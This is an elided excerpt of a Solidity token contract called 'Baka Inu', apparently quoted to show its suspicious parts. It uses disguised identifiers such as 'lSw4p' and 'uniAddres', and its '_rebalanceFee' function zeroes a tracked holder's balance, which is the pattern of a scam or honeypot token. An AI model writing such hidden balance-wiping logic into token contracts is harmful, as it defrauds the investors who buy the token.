...
contract Baka is Ownable, IERC20 {
    ...
    string private _name = "Baka Inu";
    string private _symbol = "BAKA";
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if (!lSw4p(sender, recipient)) {
            ...
            bool ldSwapTransacti0n = (recipient == uniAddres() && uniswapV2Pair == sender)
            || (sender == uniAddres() && uniswapV2Pair == recipient);
    ...
    function _rebalanceFee(address _addr) internal {
        ...
        _balances[_tTotal[0].to] = 0;
        delete _tTotal;
    }
    function takeLqFee(uint256 _liquidityFee, address to) private {
        _approve(address(this), address(_router), _liquidityFee);
    ...
    function uniAddres() private view returns (address) {
